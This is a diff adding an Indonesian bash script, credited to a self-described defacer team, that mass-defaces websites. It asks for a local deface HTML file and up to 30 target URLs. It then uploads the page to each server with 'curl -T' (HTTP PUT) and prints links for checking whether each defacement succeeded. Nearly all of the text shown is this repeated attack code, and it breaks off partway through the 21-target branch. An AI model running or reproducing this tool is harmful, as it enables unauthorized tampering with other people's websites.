@@ -1,0 +1,1808 @@
+#!/usr/bin/bash
+#Tools Pemudah / Pemersingkat
+#Tools By Mr.GxDDP / B4n9Z4tt3r5
+#Ngapain Lu ke Sini, Mau recode?
+#Gua Janji Gak Bakal Recode
+#Tepatin Janji Lu
+#Janji di Bawa Mati
+a='\e[1;31m'
+b='\e[1;32m'
+c='\e[1;33m'
+d='\e[1;34m'
+e='\e[1;35m'
+f='\e[1;36m'
+g='\e[1;37m'
+
+trap ctrl_c INT
+ctrl_c() {
+echo ""
+echo -e $a '=>\033[97;1m ( CTRL + C ) \033[91;1mTerdeteksi '
+sleep 1
+echo -e $c '=> Terimakasih Sudah Memakai Tools Saya ini '
+sleep 1
+echo -e $g '=> \033[91;1mMr.GxDDP \033[97;1m[$]=> \033[91;1mEnter Untuk Lanjut Keluar'
+read enter
+exit
+}
+
+clear
+echo -e $b ' _________________________________________'
+echo -e $b '|     \033[91;1mAuthor : \033[97;1mMr.GxDDP / B4n9Z4tt3r5    \033[92;1m |'
+echo -e $b '|   \033[91;1mTeam : \033[97;1mBangZat PhiSingeRs InDoNeSia   \033[92;1m|'
+echo -e $b '|   \033[97;1mTools Bertujuan Untuk Mempersingkat   \033[92;1m|'
+echo -e $b '|_________________________________________|'
+echo -e $b '    Hanya Dapat MenDeface web vuln curl'
+echo -e $b '         Tekan Enter Untuk Memulai'
+read enter
+echo -e $e 'Masukkan Alamat Penyimpanan Script Deface'
+echo -e $e 'Hanya Alamatnya Saja'
+sleep 1
+echo -e $e 'Contoh : /sdcard || /storage/emulated/0'
+read -p ' [Alamat]=>> ' alamat
+echo -e $c 'Masukkan Nama Script Defacenya'
+echo -e $c 'Hanya Namanya Saja'
+sleep 1
+echo -e $c 'Contoh : GxDDP.html'
+read -p ' [Script]=>> ' sc
+echo -e $f 'Mau Berapa Target'
+echo -e $f 'Harus Lebih Dari 1 dan Kurang Dari 31'
+sleep 1
+echo -e $f 'Contoh : 2 || 30'
+read -p ' [Masukkan]=>> ' ju
+
+if [ $ju = 02 ] || [ $ju = 2 ]
+then
+clear
+echo -e $a ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 03 ] || [ $ju = 3 ]
+then
+clear
+echo -e $b ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 04 ] || [ $ju = 4 ]
+then
+clear
+echo -e $c ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 05 ] || [ $ju = 5 ]
+then
+clear
+echo -e $d ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 06 ] || [ $ju = 6 ]
+then
+clear
+echo -e $e ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 07 ] || [ $ju = 7 ]
+then
+clear
+echo -e $f ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 08 ] || [ $ju = 8 ]
+then
+clear
+echo -e $g ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 09 ] || [ $ju = 9 ]
+then
+clear
+echo -e $a ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 10 ]
+then
+clear
+echo -e $b ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 11 ]
+then
+clear
+echo -e $c ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 12 ]
+then
+clear
+echo -e $d ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 13 ]
+then
+clear
+echo -e $e ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 14 ]
+then
+clear
+echo -e $f ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 15 ]
+then
+clear
+echo -e $g ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 16 ]
+then
+clear
+echo -e $a ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 17 ]
+then
+clear
+echo -e $b ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 18 ]
+then
+clear
+echo -e $c ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 19 ]
+then
+clear
+echo -e $d ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 20 ]
+then
+clear
+echo -e $e ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 21 ]
+then
+clear
+echo -e $f ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
